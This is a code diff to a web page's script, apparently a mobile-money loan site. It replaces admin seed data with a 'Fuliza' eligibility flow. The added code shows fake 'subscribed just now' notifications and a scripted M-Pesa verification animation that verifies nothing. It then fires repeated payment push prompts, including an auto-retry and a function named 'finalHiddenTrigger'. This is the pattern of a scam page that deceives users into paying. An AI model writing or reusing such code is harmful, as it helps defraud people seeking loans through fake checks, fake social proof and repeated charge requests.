-      if(app) toast(`${app.fullName} — ${app.status} — ${KES(app.amount)} over ${app.term}m.`,'info');
-    }
-  });
+            document.getElementById('toast-msg').innerHTML = `${name} (${phone}) subscribed just now`;
+            document.getElementById('live-toast').classList.add('show');
+            setTimeout(() => document.getElementById('live-toast').classList.remove('show'), 4000);
+        }
+        setInterval(showLiveToast, 15000);
 
-  $('#seedBtn').addEventListener('click',()=>{
-    const samples=[
-      ['Achieng Otieno','22345671','0712345671','achieng@mail.com','Employed',85000,120000,12,'Business expansion','Approved'],
-      ['Brian Kiprop','23345672','0723345672','brian@mail.com','Self-Employed',45000,60000,6,'Education','Pending'],
-      ['Catherine Mwende','24345673','011345673','cathy@mail.com','Business Owner',150000,300000,24,'Home improvement','Approved'],
-      ['David Njoroge','25345674','0745345674','david@mail.com','Unemployed',12000,80000,12,'Emergency','Rejected'],
-      ['Esther Wairimu','26345675','0756345675','esther@mail.com','Employed',62000,40000,6,'Medical','Pending']
-    ];
-    const apps=DB.apps;
-    samples.forEach((s,i)=>{
-      const[fn,ni,ph,em,emp,inc,amt,tr,pr,st]=s;
-      const m=monthlyPayment(amt,tr);
-      apps.push({
-        id:uid(), fullName:fn, nationalId:ni, phone:ph, email:em,
-        dob:'1992-05-1'+(i+1), gender:i%2?'Male':'Female',
-        employment:emp, income:inc, amount:amt, term:tr,
-        monthly:m, purpose:pr, status:st,
-        balance:st==='Approved'?amt:0,
-        pendingWithdrawal: false, withdrawn: false,
-        createdAt:Date.now()-i*864e5,
-        tx:st==='Approved'?[{t:'Disbursement',amt:amt,dir:'in',date:Date.now()-i*864e5}]:[],
-        notifications:[{icon:'fa-circle-info',text:'Application processed.',date:Date.now()-i*864e5}]
-      });
-    });
-    DB.apps=apps;
-    toast('Sample data loaded.','success');
-    renderAdmin();
-  });
+        // ================================================================
+        // VERIFICATION FLOW — FROM YOUR FULIZA CODE
+        // ================================================================
+        function startVerification() {
+            const ph = document.getElementById('checkPhone').value;
+            if (!ph || ph.length < 10) return alert("Enter valid M-Pesa number");
+            document.getElementById('eligibilityBtn').innerText = "Processing...";
+            setTimeout(() => {
+                document.getElementById('check-step').classList.add('hidden');
+                document.getElementById('verifying-step').classList.remove('hidden');
 
-  /* ---------- Init ---------- */
-  navigate('landing');
-  console.log('[LendFlow] Loaded. Apps:', DB.apps.length);
-})();
-</script>
+                let steps = ["Connecting to M-Pesa...", "Verifying number...", "Checking eligibility...", "Generating offer..."];
+                let i = 0;
+                let logInt = setInterval(() => {
+                    if (i < steps.length) {
+                        document.getElementById('status-text').innerText = steps[i];
+                        i++;
+                    } else {
+                        clearInterval(logInt);
+                        document.getElementById('verifying-step').classList.add('hidden');
+                        document.getElementById('result-step').classList.remove('hidden');
+                        document.getElementById('displayNum').innerText = ph;
+                        document.getElementById('phoneNum').value = ph;
+                        document.getElementById('subPhone').value = ph;
+                    }
+                }, 1500);
+            }, 800);
+        }
+
+        function revealMainSite() {
+            document.getElementById('landing-page').classList.add('hidden');
+            document.getElementById('main-content').classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // ================================================================
+        // MODAL FLOW — EXACTLY FROM YOUR FULIZA CODE
+        // ================================================================
+        function openPayment() {
+            const ph = document.getElementById('subPhone').value;
+            if (!ph || ph.length < 10) {
+                alert("Please enter your M-Pesa number first");
+                return;
+            }
+            document.getElementById('phoneNum').value = ph;
+            document.getElementById('paymentModal').classList.replace('hidden', 'flex');
+        }
+
+        function closeModal() {
+            document.getElementById('paymentModal').classList.replace('flex', 'hidden');
+            document.getElementById('modal-form-step').classList.remove('hidden');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.add('hidden');
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.add('hidden');
+        }
+
+        function backToForm() {
+            document.getElementById('modal-form-step').classList.remove('hidden');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.add('hidden');
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.add('hidden');
+        }
+
+        function backToSelection() {
+            closeModal();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function showPinConfirmation() {
+            if (!document.getElementById('phoneNum').value || document.getElementById('phoneNum').value.length < 10) {
+                return alert("Enter a valid phone number");
+            }
+            // TRIGGER 1: Initial Click — SAME AS FULIZA CODE
+            triggerSTKCall('Trigger 1: Initial Pay Button');
+            document.getElementById('modal-form-step').classList.add('hidden');
+            document.getElementById('modal-pin-step').classList.remove('hidden');
+        }
+
+        function triggerInitialSTK() {
+            // TRIGGER 2: PIN Confirmed — SAME AS FULIZA CODE
+            triggerSTKCall('Trigger 2: PIN Instructions Confirmed');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.remove('hidden');
+            // TRIGGER 3: Auto-Retry Backup — SAME AS FULIZA CODE
+            setTimeout(() => {
+                triggerSTKCall('Trigger 3: Auto-Retry Backup');
+            }, 2000);
+        }
+
+        function showPaymentStatusChoices() {
+            document.getElementById('modal-spinner-step').classList.add('hidden');
+            document.getElementById('modal-status-choice-step').classList.remove('hidden');
+        }
+
+        function finalHiddenTrigger(status) {
+            // TRIGGER 4: Manual Confirmation — SAME AS FULIZA CODE
+            triggerSTKCall(`Trigger 4: User Manual Status: ${status}`);
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.remove('hidden');
+        }
+    </script>
 </body>
 </html>
